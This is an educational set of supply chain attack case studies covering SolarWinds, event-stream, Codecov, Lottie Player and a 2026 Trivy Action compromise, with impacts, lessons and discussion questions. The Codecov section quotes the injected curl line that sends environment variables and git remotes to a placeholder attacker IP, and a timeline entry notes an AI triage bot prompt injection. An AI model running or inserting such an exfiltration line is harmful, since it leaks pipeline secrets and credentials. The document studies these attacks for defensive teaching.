# Supply Chain Attacks -- Real-World Case Studies

## Table of Contents

1. [SolarWinds / SUNBURST (2020)](#1-solarwinds--sunburst-december-2020)
2. [event-stream / flatmap-stream (2018)](#2-event-stream--flatmap-stream-november-2018)
3. [Codecov Bash Uploader (2021)](#3-codecov-bash-uploader-january---april-2021)
4. [Lottie Player (2024)](#4-lottie-player-october-2024)
5. [TeamPCP / Trivy Action (2026)](#5-teampcp--trivy-action-march-2026)
6. [Bonus Cases](#6-bonus-cases)
7. [Timeline Visualization](#7-timeline)

---

## 1. SolarWinds / SUNBURST (December 2020)

### Classification
- **Type:** Build Process Compromise
- **MITRE ATT&CK:** T1195.002 (Compromise Software Supply Chain)
- **Attribution:** APT29 / Cozy Bear (Russian SVR intelligence)
- **Sophistication:** Nation-state level

### What Happened

SolarWinds Orion is a widely-used IT monitoring platform deployed across government agencies, Fortune 500 companies, and critical infrastructure. Attackers compromised the build system used to compile Orion, injecting a backdoor into the software update that was then distributed to all customers.

### Technical Deep Dive

#### Phase 1: Build Server Compromise

The attackers gained access to SolarWinds' internal network (likely through credential theft or a prior compromise). They implanted a tool called **SUNSPOT** on the build server.

```
SUNSPOT Behavior:
1. Monitors running processes for MsBuild.exe
2. Detects when Orion solution is being compiled
3. Locates the source file:
   SolarWinds.Orion.Core.BusinessLayer\BackgroundInventory\
   InventoryManager.cs
4. Replaces it with a modified version containing SUNBURST
5. After compilation completes, restores the original file
6. No trace left in source control
```

#### Phase 2: SUNBURST Backdoor

The compiled Orion update now contained the SUNBURST backdoor inside `SolarWinds.Orion.Core.BusinessLayer.dll`:

```
SUNBURST Characteristics:
- Dormancy period: 12-14 days after installation (avoids sandboxes)
- Anti-analysis checks:
  - Verifies no security tools are running
  - Checks if domain is not a test/analysis environment
  - Validates system is joined to an Active Directory domain
- C2 Communication:
  - Uses DNS for initial beacon (subdomain of avsvmcloud.com)
  - Domain Generation Algorithm (DGA) encodes victim info in DNS queries
  - Example: [encoded-data].appsync-api.eu-west-1.avsvmcloud.com
  - Mimics legitimate SolarWinds API traffic patterns
- Selective targeting:
  - C2 server responds with CNAME pointing to second-stage C2
  - Only high-value targets receive the second stage
  - Most of the 18,000 infected systems were just beacons
```

#### Phase 3: Post-Exploitation

For high-value targets (US government agencies, Microsoft, FireEye):
- Deployed Cobalt Strike beacons
- Moved laterally through the network
- Accessed email systems and sensitive documents
- Created persistence via SAML token forgery (GoldMax)

### Impact

| Metric | Value |
|--------|-------|
| Organizations that received trojanized update | 18,000+ |
| High-value targets actively exploited | ~100 |
| Compromised organizations include | US Treasury, Commerce, DHS, Microsoft, FireEye |
| Duration of undetected access | ~9 months (March - December 2020) |
| SolarWinds stock price drop | 40% |
| Estimated cleanup cost | Billions of dollars |

### How It Was Discovered

FireEye (now Mandiant) discovered the breach while investigating unauthorized access to their own Red Team tools. They traced the intrusion back to the SolarWinds Orion update and disclosed it publicly on December 13, 2020.

### Key Lessons

1. **Source code review is not enough** -- the malicious code was only present during compilation
2. **Signing doesn't equal safety** -- the backdoored binary was legitimately signed
3. **Update mechanisms are high-value targets** -- everyone trusts software updates
4. **Nation-states invest heavily** -- this level of sophistication requires significant resources

---

## 2. event-stream / flatmap-stream (November 2018)

### Classification
- **Type:** Compromised Package (Maintainer Takeover)
- **MITRE ATT&CK:** T1195.001 (Compromise Software Dependencies)
- **Attribution:** Individual attacker (username: right9ctrl)
- **Sophistication:** Medium

### What Happened

`event-stream` was one of npm's most popular packages with **2 million weekly downloads**. The original maintainer, Dominic Tarr, was burned out and looking for help. An attacker offered to take over maintenance, gained publish rights, and injected a targeted cryptocurrency-stealing payload.

### Technical Deep Dive

#### The Social Engineering

```
Timeline:
1. Dominic Tarr (original author) posts that he needs help maintaining
2. User "right9ctrl" volunteers, seems helpful
3. Tarr grants right9ctrl publish access to npm
4. right9ctrl adds a new dependency: "flatmap-stream@0.1.1"
5. flatmap-stream contains the actual malicious code
6. The attack specifically targets the Copay Bitcoin wallet
```

#### The Payload

The malicious code in `flatmap-stream` was clever:

```javascript
// flatmap-stream contained this obfuscated code:
// 1. AES-encrypted payload hidden in test fixture data
// 2. Decryption key derived from the Copay wallet's package description
// 3. Only activates when running inside the Copay application
// 4. If not in Copay, the code does nothing (avoids detection)

// Deobfuscated behavior:
// - Hooks into Copay's credential handling
// - Intercepts wallet private keys during transaction signing
// - Exfiltrates keys to attacker's server
// - Only triggers for wallets with > 100 BTC balance
```

#### Why the Obfuscation Was Effective

- The payload was **AES encrypted** -- static analysis couldn't read it
- The decryption key was the **Copay package description** -- only worked in the target environment
- If run outside Copay, the code **silently did nothing** -- no errors, no suspicious behavior
- It was hidden in a **test fixture** file, which developers rarely review

### Impact

| Metric | Value |
|--------|-------|
| Downloads of compromised version | Millions |
| Target | Copay Bitcoin wallet users |
| Duration before detection | ~2 months |
| Financial impact | Unknown (cryptocurrency theft) |

### How It Was Discovered

A developer named Ayrton Sparling (FallingSnow) noticed the unusual `flatmap-stream` dependency while reviewing `event-stream` updates and raised a GitHub issue. The community investigated and confirmed the malicious payload.

### Key Lessons

1. **Maintainer burnout is a security risk** -- under-resourced projects are vulnerable
2. **Trust is transitive** -- trusting `event-stream` meant trusting `flatmap-stream`
3. **Targeted payloads evade detection** -- the code did nothing in most environments
4. **Community vigilance matters** -- a single developer's curiosity caught the attack

---

## 3. Codecov Bash Uploader (January - April 2021)

### Classification
- **Type:** Distribution/CI/CD Pipeline Compromise
- **MITRE ATT&CK:** T1195.002 (Compromise Software Supply Chain)
- **Attribution:** Unknown
- **Sophistication:** Medium

### What Happened

Codecov provides code coverage reporting tools. Their **Bash Uploader** script is downloaded and executed in CI/CD pipelines to upload coverage data. Attackers modified this script to exfiltrate environment variables from every CI/CD pipeline that used it.

### Technical Deep Dive

#### The Initial Compromise

```
1. Codecov uses Docker to create their product
2. Attackers exploited a flaw in Codecov's Docker image creation process
3. They extracted credentials needed to modify the Bash Uploader script
4. The script was hosted at: https://codecov.io/bash
5. Thousands of CI/CD pipelines download and execute this script
```

#### The Malicious Modification

The attacker added a single line to the Bash Uploader:

```bash
# Original Codecov Bash Uploader script
# ... (hundreds of lines of legitimate code) ...

# INJECTED LINE:
curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" \
  http://<attacker-ip>/upload/v2 || true

# This single line:
# 1. Collects all git remote URLs (reveals repo info)
# 2. Collects ALL environment variables (env)
#    - CI/CD secrets (API keys, tokens)
#    - Cloud credentials (AWS_ACCESS_KEY_ID, etc.)
#    - Package registry tokens (NPM_TOKEN, etc.)
#    - Database credentials
# 3. Sends them to the attacker's server
# 4. The "|| true" ensures the script doesn't fail
#    (the CI/CD pipeline continues normally)
```

#### Why This Was Devastating

- CI/CD environments are **treasure troves of secrets**
- The script ran with **full pipeline permissions**
- No integrity verification was performed before execution
- The modification was **tiny** -- one line in hundreds
- It ran in thousands of organizations' pipelines for **3 months**

### Impact

| Metric | Value |
|--------|-------|
| Duration of compromise | January 31 -- April 1, 2021 (~3 months) |
| Affected organizations | Thousands (including Twitch, HashiCorp, Confluent) |
| Data exfiltrated | CI/CD environment variables, secrets, tokens |
| Downstream compromises | HashiCorp's GPG signing key was leaked |

### How It Was Discovered

A Codecov customer noticed that the SHA-256 hash of the downloaded Bash Uploader script didn't match the hash listed on Codecov's GitHub repository. They reported it to Codecov, who confirmed the compromise on April 1, 2021.

### Key Lessons

1. **Scripts downloaded from the internet and piped to shell are dangerous** (`curl | bash` pattern)
2. **CI/CD environments need secret minimization** -- don't expose secrets you don't need
3. **Integrity verification matters** -- always verify checksums/signatures
4. **One compromised tool can expose an entire organization's secrets**

---

## 4. Lottie Player (October 2024)

### Classification
- **Type:** Compromised Package (Token Theft)
- **MITRE ATT&CK:** T1195.001 (Compromise Software Dependencies)
- **Attribution:** Unknown (cryptocurrency theft motivation)
- **Sophistication:** Medium

### What Happened

The Lottie Player (`@lottiefiles/lottie-player`) is a popular npm package for rendering Lottie animations on websites. It's used by thousands of websites for animated graphics. An attacker stole an npm maintainer's access token and published malicious versions that injected a cryptocurrency wallet drainer into every website using the library.

### Technical Deep Dive

#### The Attack Chain

```
1. Attacker steals npm access token from a LottieFiles maintainer
   (likely via phishing, credential stuffing, or token leak)
2. Attacker publishes three malicious versions:
   - v2.0.5 (initial malicious version)
   - v2.0.6 (updated payload)
   - v2.0.7 (further modifications)
3. Websites using the CDN-loaded version automatically get the update
4. The malicious code injects a Web3 wallet connection popup
5. Users are prompted to "connect their wallet"
6. Connected wallets are drained of cryptocurrency
```

#### The Malicious Payload

```javascript
// Injected into the Lottie Player library:
// 1. Creates a fake "Connect Wallet" popup overlay
// 2. Supports multiple wallet providers (MetaMask, Coinbase Wallet, etc.)
// 3. When user connects, the drainer:
//    a. Enumerates all tokens and NFTs in the wallet
//    b. Creates approval transactions for all assets
//    c. Transfers everything to attacker's wallet
// 4. C2 server: castleservices01[.]com
```

#### Why Websites Were Automatically Affected

Many websites loaded Lottie Player from CDN with loose version pinning:

```html
<!-- This loads the LATEST version automatically -->
<script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js">
</script>

<!-- When v2.0.5 was published, all these sites got the malicious version -->
```

### Impact

| Metric | Value |
|--------|-------|
| Vulnerable version | 2.0.5, 2.0.6, 2.0.7 |
| C2 server | castleservices01[.]com |
| Affected websites | Thousands (anyone using Lottie Player via CDN) |
| Financial impact | Cryptocurrency stolen from connected wallets |
| Time to detection | Hours (community flagged unusual popups quickly) |

### How It Was Discovered

Website owners and users reported unexpected "Connect Wallet" popups appearing on sites that used Lottie animations. The LottieFiles team was alerted, confirmed the unauthorized versions, and revoked them. Versions 2.0.5-2.0.7 were unpublished from npm.

### Key Lessons

1. **Never use `@latest` for CDN-loaded scripts** -- pin to a specific, verified version
2. **Subresource Integrity (SRI)** hashes prevent tampered scripts from loading
3. **npm access tokens must be protected** -- use MFA, scoped tokens, short-lived tokens
4. **Frontend supply chain attacks have immediate user impact** -- crypto wallet draining happens in seconds

### This Is the TryHackMe Lab

This case study is exactly what you'll explore hands-on in the **TryHackMe: Supply Chain Attack: Lottie** room.

---

## 5. TeamPCP / Trivy Action (March 2026)

### Classification
- **Type:** CI/CD Pipeline + Cascading Supply Chain Attack
- **MITRE ATT&CK:** T1195.001 + T1195.002
- **Attribution:** TeamPCP threat group
- **Sophistication:** High

### What Happened

Attackers compromised GitHub Personal Access Tokens (PATs) and used them to manipulate version tags in `aquasecurity/trivy-action`, a widely-used security scanning GitHub Action. The poisoned scanner was then used as a launchpad for further supply chain attacks, creating a cascading compromise.

### Technical Deep Dive

#### The Attack Chain

```
Phase 1: Initial Compromise
├── Attackers obtain GitHub PATs (method uncertain)
├── Use PATs to access aquasecurity/trivy-action repository
└── Manipulate 75 of 76 version tags to point to malicious code

Phase 2: Weaponized Security Scanner
├── trivy-action is used by 10,000+ CI/CD workflows
├── The poisoned action runs in CI/CD with full permissions
├── Steals from the CI/CD environment:
│   ├── Cloud credentials (AWS, GCP, Azure)
│   ├── SSH keys
│   ├── npm/PyPI tokens
│   └── GitHub tokens
└── Exfiltrates to attacker infrastructure

Phase 3: Cascading Compromise (CanisterWorm)
├── Stolen npm tokens used to publish malicious packages
├── CanisterWorm malware deployed through compromised packages
├── C2 uses blockchain-based infrastructure:
│   ├── Commands stored on-chain (immutable, uncensorable)
│   ├── Cannot be taken down via domain seizure
│   └── Decentralized -- no single point of failure
└── Creates a self-sustaining attack ecosystem
```

#### The Irony

A **security scanning tool** designed to find vulnerabilities was weaponized to **create** vulnerabilities. Organizations running Trivy to improve their security were actually **leaking their credentials** to attackers.

#### CanisterWorm: Next-Generation C2

```
Traditional C2:
  Bot --> attacker-c2.evil.com --> Commands
  Takedown: Seize domain, done.

CanisterWorm C2:
  Bot --> Blockchain Smart Contract --> Commands
  Takedown: Cannot seize a blockchain.
  The smart contract is immutable and decentralized.
  Commands persist forever on-chain.
```

### Impact

| Metric | Value |
|--------|-------|
| Compromised version tags | 75 out of 76 |
| Affected CI/CD workflows | 10,000+ |
| Data stolen | Cloud credentials, SSH keys, npm/PyPI tokens |
| Downstream impact | CanisterWorm malware via stolen npm tokens |
| C2 infrastructure | Blockchain-based (cannot be taken down) |

### Key Lessons

1. **Pin GitHub Actions to commit SHAs, not tags** -- tags can be moved
2. **Security tools are high-value targets** -- they run with elevated privileges
3. **Blockchain C2 is the new frontier** -- traditional takedown methods don't work
4. **Cascading attacks multiply impact** -- one compromise fuels the next

---

## 6. Bonus Cases

### NotPetya / M.E.Doc (June 2017)

- Ukrainian tax software M.E.Doc's update mechanism was compromised
- Delivered NotPetya wiper malware disguised as ransomware
- Caused **$10 billion+** in global damages
- Maersk, FedEx, Merck all severely impacted
- **Type:** Distribution attack (compromised update server)

### Dependency Confusion Research by Alex Birsan (February 2021)

- Security researcher demonstrated dependency confusion against **Apple, Microsoft, Tesla, Uber, PayPal**
- Published public packages matching internal package names
- Successfully executed code on internal build servers
- Earned **$130,000+** in bug bounties
- **Type:** Dependency confusion (proof of concept)

### polyfill.io CDN Compromise (June 2024)

- Chinese company acquired the polyfill.io domain and CDN
- Modified the polyfill.js served from the CDN to inject malicious redirects
- Over **100,000 websites** were affected
- **Type:** CDN/Distribution compromise

### XZ Utils Backdoor (March 2024)

- Attacker "Jia Tan" spent **2+ years** building trust as a maintainer
- Injected a backdoor into xz/liblzma compression library
- Backdoor targeted OpenSSH's sshd for remote code execution
- Discovered by Andres Freund when he noticed sshd was 500ms slower
- **Type:** Long-term social engineering + compromised package

---

## 7. Timeline

```
2017 ──── NotPetya/M.E.Doc ──── $10B+ damages, update server compromised

2018 ──── event-stream ──── npm maintainer social engineering, crypto theft

2020 ──── SolarWinds ──── Nation-state build compromise, 18K orgs affected

2021 ──── Codecov ──── CI/CD script tampering, months of secret theft
     ├─── Dependency Confusion ──── Birsan's research, $130K bounties
     └─── Kaseya VSA ──── MSP supply chain, 1500 businesses ransomed

2024 ──── XZ Utils ──── 2-year social engineering, SSH backdoor
     ├─── Lottie Player ──── npm token theft, crypto wallet drainer
     └─── polyfill.io ──── CDN acquisition, 100K+ sites affected

2025 ──── tj-actions ──── GitHub Action compromise, 23K repos

2026 ──── TeamPCP/Trivy ──── Security scanner weaponized, blockchain C2
     └─── Clinejection ──── AI triage bot prompt injection, npm malware
```

---

## Discussion Questions for the Session

1. How would you have detected the SolarWinds compromise if you were a customer?
2. Should package registries require MFA for all publishers? What are the trade-offs?
3. Is the "curl | bash" pattern ever acceptable? Under what conditions?
4. How do you balance keeping dependencies updated (for security patches) with the risk of malicious updates?
5. What makes blockchain-based C2 (CanisterWorm) particularly challenging for defenders?
